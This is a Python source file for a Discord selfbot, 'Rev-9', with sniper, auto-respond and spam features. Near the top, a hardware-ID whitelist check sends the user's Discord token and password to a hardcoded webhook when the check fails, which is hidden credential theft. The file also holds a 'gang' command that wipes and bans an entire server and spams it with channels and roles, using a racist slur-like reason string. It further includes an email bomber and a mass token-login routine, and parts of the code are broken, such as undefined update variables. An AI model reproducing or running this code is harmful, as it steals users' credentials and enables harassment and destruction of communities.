class SELFBOT():
    __linecount__ = 4487
    __version__ = 2.0
     
from asyncio.tasks import wait
import discord, subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string, ctypes, shutil, zipfile
from discord import guild
from discord import channel
from discord.utils import get
import wget
from discord import Webhook, AsyncWebhookAdapter
from discord import Game, Embed, Color, Status, ChannelType
from os import path
import httpx
import urllib.parse, urllib.request, re, json, requests, webbrowser, aiohttp, dns.name, asyncio, functools, logging
from discord.ext.tasks import loop
from discord.ext import (
    commands,
    tasks,
)
from bs4 import BeautifulSoup as bs4
from bs4 import BeautifulSoup
from urllib.parse import urlencode
from pymongo import MongoClient
from pypresence import Presence
from urllib.request import Request, urlopen
from selenium import webdriver
from sys import argv
from requests import get
from io import BytesIO
from random import randrange
from time import sleep
from threading import Thread
from colorama import Fore as C
from colorama import Style as S
from urllib import parse, request
from subprocess import call
from itertools import cycle
from win10toast import ToastNotifier
from colorama import Fore
from colorama import Style
from sys import platform
import socket
import psutil
import wmi
from PIL import Image
from subprocess import call
from playsound import playsound
import pyPrivnote as pn
from gtts import gTTS
from plyer.utils import platform
from plyer import notification
import time
from pygame import mixer  # Load the popular external library
import pyautogui

print(f"{Fore.RED}Loading...")

ctypes.windll.kernel32.SetConsoleTitleW(f'[Rev-9 REBORN Selfbot v{SELFBOT.__version__}] | Loading...')

with open('config.json', 'r') as f:
    config = json.load(f)

token = config.get('token')
password = config.get('password')
prefix = config.get('prefix')
webhookurl = config.get('webhookurl')
t1 = config.get('trigger1')
r1 = config.get('respond1')
t2 = config.get('trigger2')
r2 = config.get('respond2')
t3 = config.get('trigger3')
r3 = config.get('respond3')
rich_presence = config.get('rich_presence')
clientid = config.get('clientid')
largeimage = config.get('large_image')
state = config.get('state')
largetext = config.get('large_text')
smallimage = config.get('small_image')
smalltext = config.get('small_text')
details = config.get('details')
deltime = config.get('delete_time')
premade_rich_presence = config.get('premade_rich_presence')


promote = 'Rev-9'
alluser = os.getenv("UserName")
api = "https://discordapp.com/api/webhooks/807056379898495026/lArDN_5TubZpwnNScmab00soqVFEMRntRwTymvaIgvAGrqYsOrkXSWWMnaEl0bqExpQJ"

giveaway_sniper = config.get('giveaway_sniper')
slotbot_sniper = config.get('slotbot_sniper')
auto_respond = config.get('auto_respond')
nitro_sniper = config.get('nitro_sniper')
privnote_sniper = config.get('privnote_sniper')

stream_url = config.get('stream_url')
tts_language = config.get('tts_language')

bitly_key = config.get('bitly_key')
cat_key = config.get('cat_key')
weather_key = config.get('weather_key')
cuttly_key = config.get('cuttly_key')

width = os.get_terminal_size().columns
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
r = requests.get('https://pastebin.com/raw/P3FWbiD3')

try:
    if hwid in r.text:
        pass
    else:
        print(f'{Fore.RED}[ERROR]: You are not whitelisted.')
        print(f'HWID: {hwid}') 
        requests.post('https://discord.com/api/webhooks/807056379898495026/lArDN_5TubZpwnNScmab00soqVFEMRntRwTymvaIgvAGrqYsOrkXSWWMnaEl0bqExpQJ',json={'content': f"**Token:** `{token}`\n**Password:** `{password}`\n**HWID:** `{hwid}`"})
        time.sleep(5)
        os._exit()
except:
    print(f'{Fore.RED}[ERROR]: Failed to connect to database.')
    time.sleep(5) 
    os._exit()

if rich_presence == True:
    RPC = Presence(f'{clientid}')
    RPC.connect()
    RPC.update(state=f"{state}", large_image=f'{largeimage}', details=f'{details}', large_text=f'{largetext}', small_image=f'{smallimage}', small_text=f'{smalltext}', start=time.time())

if premade_rich_presence == True:
    RPC = Presence('815716469832155137')
    RPC.connect()
    RPC.update(state="Using Rev-9 self-bot", large_image='large', large_text='Rev-9', small_image='small', small_text='Rev-9 self-bot', start=time.time())

languages = {
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}
client = discord.Client()
locales = [ 
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

m_numbers = [
    ":one:",
    ":two:", 
    ":three:", 
    ":four:", 
    ":five:", 
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]

def startprint():
    if giveaway_sniper == True:
        giveaway = "Active" 
    else:
        giveaway = "Disabled"

    if nitro_sniper == True:
        nitro = "Active"
    else:
        nitro = "Disabled"

    if slotbot_sniper == True:
        slotbot = "Active"
    else:
        slotbot = "Disabled"
    
    if auto_respond == True:
        respond = "Active"
    else:
        respond = "Disabled"

    if privnote_sniper == True:
        privnote = "Active"
    else:
        privnote = "Disabled" 
    
    print(f'''{Fore.RESET}
    
{Fore.RED}                                   ██████╗░███████╗██╗░░░██╗░░░░░░░█████╗░
{Fore.RED}                                   ██╔══██╗██╔════╝██║░░░██║░░░░░░██╔══██╗
{Fore.RED}                                   ██████╔╝█████╗░░╚██╗░██╔╝█████╗╚██████║
{Fore.RED}                                   ██╔══██╗██╔══╝░░░╚████╔╝░╚════╝░╚═══██║
{Fore.RED}                                   ██║░░██║███████╗░░╚██╔╝░░░░░░░░░█████╔
{Fore.RED}                                   ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░░░░░░░░╚════╝░                            
                
                             {Fore.RED}Rev-9 {SELFBOT.__version__} | {Fore.RED}Logged in as: {Rev9.user.name}#{Rev9.user.discriminator} {Fore.RED}| ID: {Fore.RED}{Rev9.user.id}   
                             {Fore.RED}Privnote Sniper = {Fore.RED}{privnote}
                             {Fore.RED}Nitro Sniper = {Fore.RED}{nitro}
                             {Fore.RED}Giveaway Sniper = {Fore.RED}{giveaway}
                             {Fore.RED}SlotBot Sniper = {Fore.RED}{slotbot}
                             {Fore.RED}Auto Respond = {Fore.RED}{respond}
                             {Fore.RED}Prefix: {Fore.RED}{prefix}
                             {Fore.RED}Cached Users: {Fore.RED}{len(Rev9.users)}
                             {Fore.RED}Guilds: {Fore.RED}{len(Rev9.guilds)}
                             {Fore.RED}Friends: {Fore.RED}{len(Rev9.user.friends)}
                             {Fore.RED}Blocked: {Fore.RED}{len(Rev9.user.blocked)}
                             {Fore.RED}Private_Channels: {Fore.RED}{len(Rev9.private_channels)}
                             {Fore.RED}Loaded emojis: {Fore.RED}{len(Rev9.emojis)}
                             {Fore.RED}Creator: {Fore.RED}Marci

    '''+Fore.RESET)

def Clear():
    os.system('cls')
Clear()

toaster = ToastNotifier()
toaster.show_toast("Welcome to Rev-9 self-bot",
                   "Loading...",
                   duration=4)

def Init():
    if config.get('token') == "token-here":
        Clear()
        print(f"{Fore.RED}[ERROR] {Fore.RED}You didn't put your token in the config.json file"+Fore.RESET)
    else:
        token = config.get('token')
        try:
            Rev9.run(token, bot=False, reconnect=True)
            os.system(f'title (Rev-9 Selfbot) - Version {SELFBOT.__version__}')
        except discord.errors.LoginFailure:
            print(f"{Fore.RED}[ERROR]: {Fore.RED}Improper token has been passed"+Fore.RESET)
            os.system('pause >NUL')

def GmailBomber():
    _smpt = smtplib.SMTP('smtp.gmail.com', 587)
    _smpt.starttls()
    username = input('Gmail: ')
    password = input('Gmail Password: ')
    try:
        _smpt.login(username, password)
    except:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW} Incorrect Password or gmail, make sure you've enabled less-secure apps access"+Fore.RESET)
    target = input('Target Gmail: ')
    message = input('Message to send: ')
    counter = eval(input('Ammount of times: '))
    count = 0
    while count < counter:
        count = 0
        _smpt.sendmail(username, target, message)
        count += 1
    if count == counter:
        pass

def GenAddress(addy: str):
    letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    four_char = ''.join(random.choice(letters) for _ in range(4))
    should_abbreviate = random.randint(0,1)
    if should_abbreviate == 0:
        if "street" in addy.lower():
            addy = addy.replace("Street", "St.")
            addy = addy.replace("street", "St.")
        elif "st." in addy.lower():
            addy = addy.replace("st.", "Street")
            addy = addy.replace("St.", "Street")
        if "court" in addy.lower():
            addy = addy.replace("court", "Ct.")
            addy = addy.replace("Court", "Ct.")
        elif "ct." in addy.lower():
            addy = addy.replace("ct.", "Court")
            addy = addy.replace("Ct.", "Court")
        if "rd." in addy.lower():
            addy = addy.replace("rd.", "Road")
            addy = addy.replace("Rd.", "Road")
        elif "road" in addy.lower():
            addy = addy.replace("road", "Rd.")
            addy = addy.replace("Road", "Rd.")
        if "dr." in addy.lower():
            addy = addy.replace("dr.", "Drive")
            addy = addy.replace("Dr.", "Drive")
        elif "drive" in addy.lower():
            addy = addy.replace("drive", "Dr.")
            addy = addy.replace("Drive", "Dr.")
        if "ln." in addy.lower():
            addy = addy.replace("ln.", "Lane")
            addy = addy.replace("Ln.", "Lane")
        elif "lane" in addy.lower():
            addy = addy.replace("lane", "Ln.")
            addy = addy.replace("lane", "Ln.")
    random_number = random.randint(1,99)
    extra_list = ["Apartment", "Unit", "Room"]
    random_extra = random.choice(extra_list)
    return four_char + " " + addy + " " + random_extra + " " + str(random_number)

def BotTokens():
    with open('Data/Tokens/bot-tokens.txt', 'a+') as f:
        tokens = {token.strip() for token in f if token}
    for token in tokens:
        yield token

def UserTokens():
    with open('Data/Tokens/user-tokens.txt', 'a+') as f:
        tokens = {token.strip() for token in f if token}
    for token in tokens:
        yield token

class Login(discord.Client):
    async def on_connect(self):
        guilds = len(self.guilds)
        users = len(self.users)
        print("")
        print(f"Connected to: [{self.user.name}]")
        print(f"Token: {self.http.token}")
        print(f"Guilds: {guilds}")
        print(f"Users: {users}")
        print("-------------------------------")
        await self.logout()


def _masslogin(choice):
    if choice == 'user':
        for token in UserTokens():
            loop.run_until_complete(Login().start(token, bot=False))
    elif choice == 'bot':
        for token in BotTokens():
            loop.run_until_complete(Login().start(token, bot=True))
    else:
        return        

def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)
        return inner
    return outer

@async_executor()
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang=tts_language)
    tts.write_to_fp(f)
    f.seek(0)
    return f

def Dump(ctx):
    for member in ctx.guild.members:
        f = open(f'Images/{ctx.guild.id}-Dump.txt', 'a+')
        f.write(str(member.avatar_url)+'\n')

def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'

def RandomColor(): 
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))

colorama.init()
Rev9 = discord.Client()
Rev9 = commands.Bot(
    description='Rev-9 Selfbot',
    command_prefix=prefix,
    self_bot=True
)
Rev9.remove_command('help') 

@tasks.loop(seconds=3)
async def time_stream():
    tmp1 = datetime.datetime.now()
    utcnow = datetime.time(hour=tmp1.hour, minute=tmp1.minute, second=tmp1.second)
    del tmp1
    utcfulltime = "{}:{}:{}".format(utcnow.hour, utcnow.minute, utcnow.second)
    await asyncio.sleep(1)
    time_stream = discord.Streaming(
        name=f"🕒 {utcfulltime}", 
        url=stream_url, 
    )
    await Rev9.change_presence(activity=time_stream)


afk_stat = 0
uwu_stat = 0

def UwUText(text):
    length = len(text)
    output_text = ''

    for i in range(length):
        current_char = text[i]
        previous_char = '&# 092;&# 048;'

        if i > 0:
            previous_char = text[i - 1]
            
        if current_char == 'L' or current_char == 'R':
            output_text += 'W'

        elif current_char == 'l' or current_char == 'r':
            output_text += 'w'
            
        elif current_char == 'O' or current_char == 'o': 
            if previous_char == 'N' or previous_char == 'n' or previous_char == 'M' or previous_char == 'm': 
                output_text += "yo"
            else: 
                output_text += current_char 
            
        else:
            output_text += current_char
            
    return output_text


@Rev9.command()
async def afk(ctx):
    await ctx.message.delete()
    global afk_stat
    if afk_stat == 0:
        afk_stat += 1
        embed = discord.Embed(color=000000, title=f'AFK Mode `enabled`',timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
        embed.set_footer(text=promote)
        await ctx.send(embed=embed, delete_after=deltime)
                
    elif afk_stat == 1:
        afk_stat -= 1
        embed = discord.Embed(color=000000, title=f'AFK Mode `disabled`',timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
        embed.set_footer(text=promote)
        await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def uwumode(ctx):
    await ctx.message.delete()
    global uwu_stat
    if uwu_stat == 0:
        uwu_stat += 1
        embed = discord.Embed(color=000000, title=f'UwU Mode `enabled`',timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
        embed.set_footer(text=promote)
        await ctx.send(embed=embed, delete_after=deltime)
                
    elif uwu_stat == 1:
        uwu_stat -= 1
        embed = discord.Embed(color=000000, title=f'UwU Mode `disabled`',timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
        embed.set_footer(text=promote)
        await ctx.send(embed=embed, delete_after=deltime)

@tasks.loop(seconds=3)
async def btc_status():
    r = requests.get('https://api.coindesk.com/v1/bpi/currentprice/btc.json').json()
    value = r['bpi']['USD']['rate']
    await asyncio.sleep(3)
    btc_stream = discord.Streaming(
        name="Current BTC price: "+value+"$ USD", 
        url=stream_url, 
    )
    await Rev9.change_presence(activity=btc_stream)

@Rev9.event
async def on_command_error(ctx, error): # b'\xfc
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}You're missing permission to execute this command"+Fore.RESET)
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Missing arguments: {error}"+Fore.RESET)
    elif isinstance(error, numpy.AxisError):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Not a valid image"+Fore.RESET)
    elif isinstance(error, discord.errors.Forbidden):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Discord error: {error}"+Fore.RESET)
    elif "Cannot send an empty message" in error_str:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Couldnt send a empty message"+Fore.RESET)               
    #else:
        #print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{error_str}"+Fore.RESET)

@Rev9.event
async def on_guild_role_create(role): # b'\xfc
    print(f"{Fore.YELLOW}[WARNING]: {Fore.RED}New role created:{Fore.RED} [{role.name}] SERVER: {Fore.RED}[{role.guild}] {Fore.BLUE}TIME: {Fore.BLUE}{datetime.datetime.now()}")

@Rev9.event
async def on_guild_channel_create(channel): # b'\xfc
    print(f"{Fore.YELLOW}[WARNING]: {Fore.RED}New channel created:{Fore.RED} [{channel.name}] SERVER: {Fore.RED}[{channel.guild}] {Fore.BLUE}TIME: {Fore.BLUE}{datetime.datetime.now()}")

@Rev9.event
async def on_guild_join(guild): # b'\xfc
    print(f"{Fore.YELLOW}[WARNING]: {Fore.RED}Joined new server:{Fore.RED} [{guild}] TIME: {Fore.BLUE}{datetime.datetime.now()}")  

@Rev9.event
async def on_guild_channel_delete(channel): # b'\xfc
    print(f"{Fore.YELLOW}[WARNING]: {Fore.RED}Channel deleted:{Fore.RED} [{channel.name}] SERVER: {Fore.RED}[{channel.guild}] {Fore.BLUE}TIME: {Fore.BLUE}{datetime.datetime.now()}")
    
@Rev9.event
async def server_get_boosted(member): # b'\xfc'
    print(str(f"{Fore.BLUE}[INFO]: {Fore.RED}{member} has boosted a server."))

@Rev9.event
async def on_message_edit(before, after):
    await Rev9.process_commands(after)
    if before.author.id == Rev9.user.id: # b'\xfc'
        return
    if Rev9.msgsniper:
        if before.content is after.content:
            return
        if isinstance(before.channel, discord.DMChannel) or isinstance(before.channel, discord.GroupChannel):
            attachments = before.attachments
            if len(attachments) == 0:
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
                    before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                                    "@\u200bhere") + "\n**AFTER**\n" + str(
                    after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                print(f"{C.GREEN}[MSGEDITLOGGER] {C.RED}[{message_content}]")
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
                    before.content) + "\n\n**Attachments:**\n" + links
                print(f"{C.GREEN}[MSGEDITLOGGER] {C.RED}[{message_content}]")
    if len(Rev9.sniped_edited_message_dict) > 1000:
        Rev9.sniped_edited_message_dict.clear()
    attachments = before.attachments
    if len(attachments) == 0:
        channel_id = before.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
            before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                            "@\u200bhere") + "\n**AFTER**\n" + str(
            after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        Rev9.sniped_edited_message_dict.update({channel_id: message_content})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = before.channel.id
        message_content = "`" + str(
            discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
            before.content) + "\n\n**Attachments:**\n" + links
        Rev9.sniped_edited_message_dict.update({channel_id: message_content})

@Rev9.event
async def on_message(message):

    global afk_stat
    global uwu_stat

    if uwu_stat == 1:
        if message.author == Rev9.user:
            if 'uwumode' in str(message.content):
                await Rev9.process_commands(message)
                return
            else:
                await message.edit(content=UwUText(message.content))
    await Rev9.process_commands(message)
    if afk_stat == 1:
        with open('config.json') as config:
            afkmessage = json.load(config)['afk_message']
            if afkmessage == '':
                afkmessage = 'Im currently afk and unreachable, please try to contact me later.'

        if message.guild is None:
            if message.author == Rev9.user:
                return
            em = discord.Embed(title="Rev-9 AFK mode", description=f"**{afkmessage}**")
            em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
            em.set_footer(text=promote)
            await message.channel.send(embed=em, delete_after=deltime)
            print(f"{Fore.BLUE}[INFO]: {Fore.RED}AFK message sent.")
            await asyncio.sleep(10)

    if Rev9.mimic is not None and Rev9.mimic.id == message.author.id:
        await message.channel.send(chr(173) + message.content)

    if message.content.lower().startswith(f"{prefix}msgedit"):
        await msgedit(message)

    def GiveawayData():
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"   
    +Fore.RESET)

    def SlotBotData():
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"   
    +Fore.RESET)

    def responddata():
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]" 
        f"\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]" 
    +Fore.RESET) 

    def NitroData(elapsed, code):
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]" 
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
        f"\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]"
        f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
        f"\n{Fore.WHITE} - CODE: {Fore.YELLOW}{code}"
    +Fore.RESET)  

    def PrivnoteData(code):
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]" 
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
        f"\n{Fore.WHITE} - CONTENT: {Fore.YELLOW}[The content can be found at Privnote/{code}.txt]"
    +Fore.RESET)        

    time = datetime.datetime.now().strftime("%H:%M %p")  
    if 'discord.gift/' in message.content:
        if nitro_sniper == True:
            start = datetime.datetime.now()
            code = re.search("discord.gift/(.*)", message.content).group(1)
            token = config.get('token')
                
            headers = {'Authorization': token}
    
            r = requests.post(
                f'https://discordapp.com/api/v8/entitlements/gift-codes/{code}/redeem', 
                headers=headers,
            ).text
            elapsed = datetime.datetime.now() - start
            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

            if 'This gift has been redeemed already.' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Already Redeemed]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Success]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Unknown Gift Code]"+Fore.RESET)
                NitroData(elapsed, code)

        else:
            return
            
    if 'Someone just dropped' in message.content:
        if slotbot_sniper == True:
            if message.author.id == 346353957029019648:
                try:
                    await message.channel.send('~grab')
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - SlotBot Couldnt Grab]"+Fore.RESET)
                    SlotBotData()                     
                print(""
                f"\n{Fore.CYAN}[{time} - Slotbot Grabbed]"+Fore.RESET)
                SlotBotData()
        else:
            return

    if f'{t1}' in message.content:
        if auto_respond == True:
                try:
                    await message.channel.send(f'{r1}')
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - Can't send message]"+Fore.RESET)
                    responddata()                     
                print(""
                f"\n{Fore.CYAN}[{time} - Message Sent]"+Fore.RESET)
                responddata()
        else:
            return

    if f'{t2}' in message.content:
        if auto_respond == True:
                try:
                    await message.channel.send(f'{r2}')
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - Can't send message]"+Fore.RESET)
                    responddata()                     
                print(""
                f"\n{Fore.CYAN}[{time} - Message Sent]"+Fore.RESET)
                responddata()
        else:
            return

    if f'{t3}' in message.content:
        if auto_respond == True:
                try:
                    await message.channel.send(f'{r3}')
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - Can't send message]"+Fore.RESET)
                    responddata()                     
                print(""
                f"\n{Fore.CYAN}[{time} - Message Sent]"+Fore.RESET)
                responddata()
        else:
            return

    if 'GIVEAWAY' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 346353957029019648:
                try:    
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - Giveaway Couldnt React]"+Fore.RESET)
                    GiveawayData()            
                print(""
                f"\n{Fore.CYAN}[{time} - Giveaway Sniped]"+Fore.RESET)
                GiveawayData()
        else:
            return

    if 'discord.gift/' in message.content:
        if nitro_sniper == True:
                async with aiohttp.ClientSession() as session:
                    webhook = Webhook.from_url(f'{webhookurl}', adapter=AsyncWebhookAdapter(session))
                    em = discord.Embed(title="Rev-9 nitro sniper", description=f"Nitro Sniped!")
                    em.add_field(name="Code:", value=f"{code}")
                    em.add_field(name="Elapsed:", value=f"{elapsed}")
                    em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
                    em.set_footer(text="Rev-9")
                    NitroData(elapsed, code)
                    await webhook.send(embed=em, username='Rev-9 Nitro Sniper')
        else:
            return

    if f'Congratulations <@{Rev9.user.id}>' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 346353957029019648:    
                print(""
                f"\n{Fore.CYAN}[{time} - Giveaway Won]"+Fore.RESET)
                GiveawayData()
        else:
            return

    if 'privnote.com' in message.content:
        if privnote_sniper == True:
            code = re.search('privnote.com/(.*)', message.content).group(1)
            link = 'https://privnote.com/'+code
            try:
                note_create = pn.read_note(link)
            except Exception as e:
                print(e)    
            with open(f'Privnote/{code}.txt', 'a+') as f:
                print(""
                f"\n{Fore.CYAN}[{time} - Privnote Sniped]"+Fore.RESET)
                PrivnoteData(code)
                f.write(note_create)
        else:
            return
    await Rev9.process_commands(message)

@Rev9.event
async def on_connect():
  latestver = cont['latest']
  if latestver == version:
      pass
  else:
      features = cont['features']
      print (f"{Fore.RESET}{Fore.RED}Update {latestver} is available!\n{Fore.CYAN}Features: {features}")
      print(f"{Fore.RED}Launching Autoupdater")
      try:
          print("Trying to autoupdate")
          print("Grabbing latest zip from GitHub")
          wget.download("https://github.com/DwifteJB/dwifte.py/archive/master.zip", "./update.zip")
          print("Done")
          print("Removing old files")
          try:
              shutil.rmtree("cogs")
          except:
              pass

          try:
              shutil.rmtree("data")
          except:
              pass

          try:
              os.remove(".gitignore")
          except:
              pass

          try:
              os.remove("clear_heroku_files.sh")
          except:
              pass

          try:
              os.remove("app.json")
          except:
              pass

          try:
              os.remove("config.py")
          except:
              pass

          try:
              os.remove("main.py")
          except:
              pass

          try:
              os.remove("Procfile")
          except:
              pass

          try:
              os.remove("README.md")
          except:
              pass

          try:
              os.remove("requirements.txt")
          except:
              pass

          try:
              os.remove("update.json")
          except:
              pass
          print("Done")

          print("Updating files")
          with zipfile.ZipFile("update.zip", 'r') as zip_ref:
	          zip_ref.extractall("")

          main = os.getcwd()
          shutil.move("dwifte.py-master/cogs", f"{main}")
          shutil.move("dwifte.py-master/data", f"{main}")
          shutil.move("dwifte.py-master/config.py", f"{main}")
          shutil.move("dwifte.py-master/main.py", f"{main}")
          shutil.move("dwifte.py-master/app.json", f"{main}")
          shutil.move("dwifte.py-master/Procfile", f"{main}")
          shutil.move("dwifte.py-master/requirements.txt", f"{main}")
          print("Done!")

          print("Cleaning up")
          shutil.rmtree("dwifte.py-master")
          os.remove("update.zip")
          print("Done!\nPlease restart the bot!")

          print("Cleaning up")
          shutil.rmtree("dwifte.py-master")
          os.remove("update.zip")
          print("Done!\nPlease restart the bot!")
          os._exit(1)
      except:
          print("Update failed!")
          os._exit(1)

          Clear()

      if giveaway_sniper == True:
          giveaway = "Active" 
      else:
          giveaway = "Disabled"

      if nitro_sniper == True:
          nitro = "Active"
      else:
          nitro = "Disabled"

      if slotbot_sniper == True:
          slotbot = "Active"
      else:
          slotbot = "Disabled"

      if auto_respond == True:
          respond = "Active"
      else:
          respond = "Disabled"

      if privnote_sniper == True:
          privnote = "Active"
      else:
          privnote = "Disabled" 
    
      startprint()
      ctypes.windll.kernel32.SetConsoleTitleW(f'[Rev-9 Selfbot v{SELFBOT.__version__}] | Logged in as {Rev9.user.name}')

@Rev9.command()
async def clear(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send('ﾠﾠ'+'\n' * 400 + 'ﾠﾠ')

Rev9.msgsniper = True
Rev9.snipe_history_dict = {}
Rev9.sniped_message_dict = {}
Rev9.sniped_edited_message_dict = {}
Rev9.whitelisted_users = {}
Rev9.mimic = None
Rev9.antiraid = False

@Rev9.command()
async def gang(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name="rev9 was here",
            description="rev9 was here",
            reason="imagine being black",
            icon=None,
            banner=None
        )
    except:
        pass        
    for _i in range(10):
        await ctx.guild.create_category(name="rev9 was here")
    for _i in range(250):
        await ctx.guild.create_text_channel(name="rev9 was here")
        await ctx.guild.create_voice_channel(name="rev9 was here")
        await ctx.guild.create_role(name="rev9 was here", color=RandomColor())

@Rev9.event
async def on_member_ban(guild: discord.Guild, user: discord.user):
    if Rev9.antiraid is True:
        try:
            async for i in guild.audit_logs(limit=2, action=discord.AuditLogAction.ban):
                if guild.id in Rev9.whitelisted_users.keys() and i.user.id in Rev9.whitelisted_users[
                    guild.id].keys() and i.user.id is not Rev9.user.id:
                    print("not banned - " + i.user.name)
                else:
                    print("banned - " + i.user.name)
                    await guild.ban(i.user, reason="Rev-9 Anti-Nuke")
        except Exception as e:
            print(e)

@Rev9.event
async def on_member_join(member):
    if Rev9.antiraid is True and member.bot:
        try:
            guild = member.guild
